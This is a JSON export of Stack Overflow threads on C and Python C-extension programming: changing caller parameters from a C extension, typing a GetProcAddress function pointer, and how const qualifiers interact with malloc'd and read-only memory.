[{"tags": ["python", "c", "python-3.x", "python-c-api", "python-extensions"], "comments": [{"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1518650748, "post_id": 48797834, "comment_id": 84598374, "body": "Are you trying to replicate the behavior of a C function that takes a <code>something *pointer</code> and assigns to <code>*pointer</code>? That&#39;s not something Python supports."}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1518651550, "post_id": 48797834, "comment_id": 84598608, "body": "I tried to answer as best I could, but the lack of details here makes me suspect <a href=\"https://meta.stackexchange.com/q/66377/322040\">an XY problem</a>; in general, you shouldn&#39;t have resource allocating functions that are also returning other values (if they fail, they raise exceptions), because it becomes quite difficult to properly manage the resources properly (you&#39;d have to unpack, then use a <code>with</code> to ensure proper closure). Can you provide more details?"}, {"owner": {"reputation": 23, "user_id": 9362491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab77dae915827ac58a914503757c5ee4?s=128&d=identicon&r=PG&f=1", "display_name": "Jay Lofstead", "link": "https://stackoverflow.com/users/9362491/jay-lofstead"}, "edited": false, "score": 0, "creation_date": 1518707303, "post_id": 48797834, "comment_id": 84624050, "body": "The file handle is a good example. In C, it would be FILE *. I want to pass one back so I was expecting that I could update the reference passed in with a new value (assuming a FILE ** is passed in in the form of a uint64_t * that I would cast back and forth in the C code assuming that the Python programmer doesn&#39;t munge it). It seems that this isn&#39;t the right thing to do nor really possible without writing all but broken code or code that is flaky at best."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 9362491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab77dae915827ac58a914503757c5ee4?s=128&d=identicon&r=PG&f=1", "display_name": "Jay Lofstead", "link": "https://stackoverflow.com/users/9362491/jay-lofstead"}, "edited": false, "score": 0, "creation_date": 1518707114, "post_id": 48797925, "comment_id": 84623905, "body": "Thanks. This explains why I can&#39;t figure it out."}], "tags": [], "owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "is_accepted": true, "score": 2, "last_activity_date": 1518651385, "last_edit_date": 1518651385, "creation_date": 1518651049, "answer_id": 48797925, "question_id": 48797834, "link": "https://stackoverflow.com/questions/48797834/how-to-change-function-parameter-values-in-a-python-3-c-extension/48797925#48797925", "title": "How to change function parameter values in a Python 3 C extension?", "body": "<p>You can't change what the caller's parameter refers to in the caller, all you can do is perform mutations of the object itself using its API. Basically, you received a <em>copy</em> of the caller's pointer, <em>not</em> a C++-style <em>reference</em> (nor a C-style double pointer that would give you access to a pointer declared in the caller), so you can't reassign the argument in the caller.</p>\n\n<p>In general, you don't <em>want</em> to try to perfectly reproduce C APIs (I'm assuming your C API uses double-pointers to allow reassigning the value in the caller?) in Python APIs. That's how PHP operates, and it makes for terribly inconsistent APIs that often take no advantage of being in a high level language.</p>\n\n<p>This case is doubly-fraught because, when used properly with <code>with</code> statements, file-like objects actually have multiple references (not C++ meaning) to them, the named variable (that was passed to your function) and one or more hidden references held inside the interpreter (to ensure the <code>with</code> statement has a consistent <code>__exit__</code> to call, even if the caller deletes their own binding for the object). Even if you could somehow reassign the caller's argument, the <code>with</code> statement would still refer to the original file object, and it wouldn't be obvious to the caller that they needed to <code>close</code> (implicitly using <code>with</code> or explicitly calling <code>close</code>) the result again because your function replaced their object.</p>\n\n<p>Return multiple results (<a href=\"https://docs.python.org/3/c-api/arg.html#c.Py_BuildValue\" rel=\"nofollow noreferrer\"><code>Py_BuildValue</code> makes this easy</a>), and the caller can replace their value if they want to.</p>\n"}], "owner": {"reputation": 23, "user_id": 9362491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab77dae915827ac58a914503757c5ee4?s=128&d=identicon&r=PG&f=1", "display_name": "Jay Lofstead", "link": "https://stackoverflow.com/users/9362491/jay-lofstead"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 175, "favorite_count": 0, "accepted_answer_id": 48797925, "answer_count": 1, "score": 2, "last_activity_date": 1536941162, "creation_date": 1518650404, "last_edit_date": 1536941162, "question_id": 48797834, "link": "https://stackoverflow.com/questions/48797834/how-to-change-function-parameter-values-in-a-python-3-c-extension", "title": "How to change function parameter values in a Python 3 C extension?", "body": "<p>I can't figure out how to change the value of a parameter passed from Python to C. </p>\n\n<pre><code>PyArg_ParseTuple (args, \"Os\", &amp;file_handle, &amp;filename)\n</code></pre>\n\n<p>will let me get file_handle as a <code>PyObject *</code>. Is there a way to change the value <code>file_handle</code> represents? I know I can return multiple values to a Python function call, but that isn't what I want to do in this case. Just for consistency with the C API I am making a module to represent.</p>\n"}, {"tags": ["c", "dll", "function-pointers"], "comments": [{"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 1, "creation_date": 1518649127, "post_id": 48797529, "comment_id": 84597803, "body": "Is <code>return_pointer</code> meant to hold the pointer to the function itself, or the pointer that the function returns?  In the code shown, you haven&#39;t actually called the function yet."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1518649187, "post_id": 48797529, "comment_id": 84597829, "body": "(Also, I think you don&#39;t need to call LoadLibrary <i>and</i> GetModuleHandle, just one or the other, but I could be wrong about that.)"}, {"owner": {"reputation": 1471, "user_id": 8276973, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/96a6954bd630cf29b8529b41d9ce66fc?s=128&d=identicon&r=PG&f=1", "display_name": "RTC222", "link": "https://stackoverflow.com/users/8276973/rtc222"}, "reply_to_user": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 0, "creation_date": 1518649633, "post_id": 48797529, "comment_id": 84597997, "body": "It holds the pointer to the function, but I can&#39;t call the function until I get the function pointer, and that&#39;s where I&#39;m having trouble."}], "answers": [{"comments": [{"owner": {"reputation": 1471, "user_id": 8276973, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/96a6954bd630cf29b8529b41d9ce66fc?s=128&d=identicon&r=PG&f=1", "display_name": "RTC222", "link": "https://stackoverflow.com/users/8276973/rtc222"}, "edited": false, "score": 0, "creation_date": 1518650385, "post_id": 48797777, "comment_id": 84598259, "body": "Thanks, zwol.  It works except that it&#39;s dllfunc1 return_pointer (no asterisk needed).  Yes, it&#39;s true that you don&#39;t need to call both."}], "tags": [], "owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "is_accepted": true, "score": 3, "last_activity_date": 1518650407, "last_edit_date": 1518650407, "creation_date": 1518650007, "answer_id": 48797777, "question_id": 48797529, "link": "https://stackoverflow.com/questions/48797529/correct-way-to-call-getmodulehandle-in-c-and-return-function-pointer/48797777#48797777", "title": "Correct way to call GetModuleHandle in C and return function pointer", "body": "<p>I believe your code should be like this:</p>\n\n<pre><code>typedef double *(*dllfunc1)(double *);\n\nHANDLE dll_handle = LoadLibrary(dllname);\ndllfunc1 Main_Entry_fn = (dllfunc1)(GetProcAddress(dll_handle, \"Main_Entry_fn\"));\n\ndouble *result = Main_Entry_fn(argument);\n</code></pre>\n\n<p><code>dllfunc1</code>, which is a pointer-to-function type, is the correct type for the pointer-to-function variable that will hold the pointer returned by <code>GetProcAddress</code>.  <code>double *</code> is just the type of the pointer returned by <code>Main_Entry_fn</code>, so that's the right type for the variable that holds the result of <em>actually calling</em> <code>Main_Entry_fn</code>.</p>\n\n<p>Also, if I'm reading MSDN correctly, you do not need to call both <code>LoadLibrary</code> and <code>GetModuleHandle</code>; one or the other is enough.</p>\n\n<p>Also also, it will be less confusing if you name the pointer-to-function after the function you're looking up by name.</p>\n\n<p>Also also also, pointer asterisks bind to the right, so never cuddle them to the left, even if you're writing C++.</p>\n"}], "owner": {"reputation": 1471, "user_id": 8276973, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/96a6954bd630cf29b8529b41d9ce66fc?s=128&d=identicon&r=PG&f=1", "display_name": "RTC222", "link": "https://stackoverflow.com/users/8276973/rtc222"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 374, "favorite_count": 0, "accepted_answer_id": 48797777, "answer_count": 1, "score": 2, "last_activity_date": 1518650407, "creation_date": 1518648591, "last_edit_date": 1518649939, "question_id": 48797529, "link": "https://stackoverflow.com/questions/48797529/correct-way-to-call-getmodulehandle-in-c-and-return-function-pointer", "title": "Correct way to call GetModuleHandle in C and return function pointer", "body": "<p>I am calling a DLL from C, but when I call GetProcAddress, GCC says:</p>\n\n<pre><code>warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]\n</code></pre>\n\n<p>The DLL takes a pointer to a double array and returns a pointer to a double array.  Here is the relevant part of the C code:</p>\n\n<pre><code>typedef double* (*dllfunc1)(double*);\ndouble *return_pointer;\n\nhinstLib = LoadLibrary(dllname);\ndll_handle = GetModuleHandle(dllname);\nreturn_pointer = (dllfunc1)(GetProcAddress(dll_handle, \"Main_Entry_fn\"));\n</code></pre>\n\n<p>The final line is the one that fails.  I have tried a number of different permutations, but none has worked.  There is a fair amount of info on the net about typedef prototypes for function pointers, but very few in the context of GetProcAddress to call a DLL function.  </p>\n\n<p>When I change the definition of return_pointer to:  </p>\n\n<pre><code>int return_pointer\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>warning: assignment makes integer from pointer without a cast\n</code></pre>\n\n<p>So it looks like the problem is in the variable \"return_pointer.\"  Most likely it needs to be defined as int and cast to a pointer, but I haven't been able to cast it to a pointer.  The original definition (*double) was because it returns a pointer to a double array.  </p>\n\n<p>Where am I going wrong?  Any ideas will be very much appreciated.  Thanks.  </p>\n"}, {"tags": ["c", "gcc", "malloc", "linux-mint"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 4, "creation_date": 1518648091, "post_id": 48797374, "comment_id": 84597405, "body": "<i>but why the compiler does not see (ignores) the fact that even if I made a &quot;Promise&quot; that I will not try to modify that Variable</i> isn&#39;t that the point of the cast? To tell the compiler &quot;hey treat this variable as this and not as that&quot;."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 2, "creation_date": 1518648107, "post_id": 48797374, "comment_id": 84597414, "body": "C compilers are under no obligation to always fail when you do something wrong. That would be far too helpful."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1518648186, "post_id": 48797374, "comment_id": 84597449, "body": "Whether a pointer has <code>const</code>  actually has <i>nothing whatsoever</i> to do with whether what it points to can change. <code>const</code> is basically a thing you can optionally use to protect yourself from your own mistakes, but it doesn&#39;t mean very much to the computer."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518648195, "post_id": 48797374, "comment_id": 84597454, "body": "Yes, I do understand that, bu the compiler see this ` char const* arr` but it can not see this ` const char *arr`"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1518648215, "post_id": 48797374, "comment_id": 84597462, "body": "<code>const char* arr</code> and <code>char const* arr</code> mean exactly the same thing"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1518648283, "post_id": 48797374, "comment_id": 84597483, "body": "@immibis I am asking about <code>const  char *arr</code> vs <code>const char *const arr</code> which are not the same."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 2, "creation_date": 1518683995, "post_id": 48797374, "comment_id": 84608568, "body": "The compiler &quot;sees&quot; <code>const char *</code> but you explicitely tell the compiler to close an eye or two and treat it as <code>char *</code> when you cast your pointer: <code>(char*)arr</code>"}], "answers": [{"comments": [{"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518648860, "post_id": 48797474, "comment_id": 84597704, "body": "This is another prove of being not a good Idea to just put a cast to fix a compiler Warning."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 1, "creation_date": 1518648908, "post_id": 48797474, "comment_id": 84597724, "body": "@Michi Yes, indeed.  Always try to understand why the compiler is complaining before you try to &quot;shut it up.&quot;"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518649197, "post_id": 48797474, "comment_id": 84597833, "body": "I wanted to know why this is happens, because <a href=\"https://pastebin.com/raw/wYtjySZe\" rel=\"nofollow noreferrer\">Something like This</a> leads to <code>segfault</code> and not to a compiler warning like in the case <a href=\"https://pastebin.com/raw/RLbLSwPS\" rel=\"nofollow noreferrer\">Of this example</a> where the compiler catch it"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518649354, "post_id": 48797474, "comment_id": 84597888, "body": "&quot;variables declared with const are also put in a read-only memory area&quot;  sounds like a contradiction: How can something that is a <i>variable</i> be  <code>const</code> or <i>read-only</i>?  I like the spec <i>object</i> to avoid that.  Still UV for good answer."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518649356, "post_id": 48797474, "comment_id": 84597889, "body": "@Michi Yep, that&#39;s no different than <code>char *hello = &quot;Hello&quot;; strcpy(hello, &quot;Bonjour&quot;);</code> \u2014 the pointer is not <code>const</code> but the data pointed to is in read-only memory.  The compiler only checks <code>const</code>, but the CPU only checks whether the memory is read-only."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518649476, "post_id": 48797474, "comment_id": 84597934, "body": "@chux In strictly proper C11-ese, &quot;variable declared with <code>const</code>&quot; would be &quot;object defined with a const-qualified type&quot;, but I thought that was too much jargon."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 1, "creation_date": 1518649520, "post_id": 48797474, "comment_id": 84597955, "body": "@Michi Isn&#39;t that what I said would happen?  In both my example and yours, the pointer is not <code>const</code>, so you get no warnings, but the memory is read-only, so you get a segfault."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518649533, "post_id": 48797474, "comment_id": 84597958, "body": "@zwol I deleted my last Commend. I noticed the Point to late :D"}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518649772, "post_id": 48797474, "comment_id": 84598054, "body": "@Michi Something else you may not realize is that &quot;passing argument 1 of \u2018strcpy\u2019 discards \u2018const\u2019 qualifier from pointer target type&quot; is effectively the same diagnostic as &quot;assignment of read-only location&quot;, even though they sound very different and one of them is only a warning."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518649915, "post_id": 48797474, "comment_id": 84598116, "body": "@zwol I noticed that and I was concentrating myself only to the declaration of <code>arr</code> and not of what was really happening after that."}], "tags": [], "owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "is_accepted": false, "score": 4, "last_activity_date": 1518650595, "last_edit_date": 1518650595, "creation_date": 1518648372, "answer_id": 48797474, "question_id": 48797374, "link": "https://stackoverflow.com/questions/48797374/how-do-compilers-treat-const-qualifier-when-the-pointer-points-to-a-memory-locat/48797474#48797474", "title": "How do compilers treat CONST qualifier when the pointer points to a memory location obtained with malloc()?", "body": "<p>Part of this is very simple:</p>\n\n<pre><code>strcpy ( (char*)arr , \"Hello\" );\n</code></pre>\n\n<p>See that <code>(char*)</code>? When you do that, you take back the promise.  If you had written</p>\n\n<pre><code>strcpy (arr, \"Hello\");\n</code></pre>\n\n<p>with no cast, the compiler would have objected.</p>\n\n<p>The other part of this is understanding that <code>const</code> annotations on pointers in C are only weakly connected to whether or not the pointed-to memory location is writable.  Heap blocks returned by <code>malloc</code> and <code>calloc</code> are always in a memory area that <em>is</em> writable.  When you set a <code>const</code> pointer to point to a heap block returned by <code>malloc</code>, the compiler will object to any attempt to write through that pointer, but if you cast away the <code>const</code> (take back the promise), or if you just ignore the warning, the write will work fine at runtime, because the memory area is still writable even though the pointer was <code>const</code>.</p>\n\n<p>Conversely, string literals are usually in a memory area that <em>isn't</em> writable.  You can still refer to them using non-<code>const</code> pointers, and the compiler won't object to you writing through those pointers, but the writes <em>won't</em> work at runtime, because the memory area is read-only.  And <em>data objects</em> declared with <code>const</code> (e.g. <code>const int numbers[] = { 1, 2, 3 };</code>) are also put in a read-only memory area, so again you can't write to them \u2014 whether or not you do it through a non-<code>const</code> pointer.</p>\n\n<p>It is usually possible to change whether a memory area is writable, but you have to use operating system functions like <a href=\"https://linux.die.net/man/2/mprotect\" rel=\"nofollow noreferrer\">mprotect</a>.  Casts don't do that for you -- they usually don't generate any code at all, in fact.</p>\n"}, {"tags": [], "owner": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "is_accepted": false, "score": 1, "last_activity_date": 1518648445, "creation_date": 1518648445, "answer_id": 48797499, "question_id": 48797374, "link": "https://stackoverflow.com/questions/48797374/how-do-compilers-treat-const-qualifier-when-the-pointer-points-to-a-memory-locat/48797499#48797499", "title": "How do compilers treat CONST qualifier when the pointer points to a memory location obtained with malloc()?", "body": "<p>The cast to <code>char *</code> here</p>\n\n<pre><code>strcpy ( (char*)arr , \"Hello\" );\n</code></pre>\n\n<p>makes compiler ignore your promise <em>in this place only</em>.</p>\n\n<p>If the object <code>arr</code> points to was originally created as non-const, then you're fine. If not, then it's <em>undefined behaviour</em> and you risk getting a segfault.</p>\n"}, {"comments": [{"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518648754, "post_id": 48797501, "comment_id": 84597655, "body": "<code>But the rules of C allow you to add const temporarily and remove it later</code> This is the part which I was not understand it. All answers are OK, but I can only one accept it."}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": true, "score": 7, "last_activity_date": 1536923190, "last_edit_date": 1536923190, "creation_date": 1518648458, "answer_id": 48797501, "question_id": 48797374, "link": "https://stackoverflow.com/questions/48797374/how-do-compilers-treat-const-qualifier-when-the-pointer-points-to-a-memory-locat/48797501#48797501", "title": "How do compilers treat CONST qualifier when the pointer points to a memory location obtained with malloc()?", "body": "<p>You are allowed to remove <code>const</code> from a pointer if it was not <code>const</code> originally.</p>\n\n<p><code>calloc</code> returns a <code>void *</code>. When you assign it to a <code>const char *</code>, you add <code>const</code>. But the rules of C allow you to add <code>const</code> temporarily and remove it later. You might want to do this, for example, when some routines create data, then give the data to some other routines that should only read the data, but, later, the pointer is passed back to be freed or further changed, in which case <code>const</code> must be removed.</p>\n\n<p>In short, <code>const</code> is a convenience for software that wants to obey the rules. It asks the compiler to notify you when you accidentally try to write with a <code>const</code> pointer. It does necessarily stop you from deliberately breaking the rules by removing <code>const</code> inappropriately.</p>\n\n<p>(To be more precise about the opening sentence: C is very flexible about pointer conversions. You can largely convert different types of pointers, as long as alignment requirements are met. It is actually using pointers to access memory that runs into trouble when done incorrectly.)</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1518648948, "post_id": 48797576, "comment_id": 84597739, "body": "&quot; means that the value of that variable can never change.&quot; is more like &quot;means that attempting to change the value is UB&quot;.  It might work, it might not, code may crash, etc."}, {"owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1518649147, "post_id": 48797576, "comment_id": 84597809, "body": "@chux Both are true. Or okay, maybe &quot;can never change in a correct program&quot;, but as we know, for a program with UB absolutely all guarantees are void."}], "tags": [], "owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "is_accepted": false, "score": 2, "last_activity_date": 1518648845, "creation_date": 1518648845, "answer_id": 48797576, "question_id": 48797374, "link": "https://stackoverflow.com/questions/48797374/how-do-compilers-treat-const-qualifier-when-the-pointer-points-to-a-memory-locat/48797576#48797576", "title": "How do compilers treat CONST qualifier when the pointer points to a memory location obtained with malloc()?", "body": "<p>A <code>const</code> that applies directly to a variable definition means that the value of that variable can never change.</p>\n\n<p>But when a pointer points to a <code>const</code> type, that does NOT mean the thing it points to will never change, only that it cannot be changed via that particular pointer.</p>\n\n<p>For example, this program is entirely valid:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(void) {\n    char str[] = \"abcd\";\n    const char* p = str;\n    str[0] = 'x';\n    printf(\"%s\\n\", p); /* Prints \"xbcd\" */\n    return 0;\n}\n</code></pre>\n\n<p>Note the data <code>p</code> points to was changed via its original object, even though <code>p</code> is declared as pointing to const.  And then <code>p</code> continues to point at the object <code>str[0]</code> which has a new value.</p>\n\n<p>In your <code>calloc</code> example, there is no <code>const</code> variable definition, so the data is not guaranteed to be unchanged.  You made a promise not to change it via <code>arr</code> only.  But then the explicit cast creates another pointer that doesn't have the <code>const</code> restriction, and it's fine to change that originally non-const data using it.</p>\n"}], "owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "delete_vote_count": 0, "reopen_vote_count": 0, 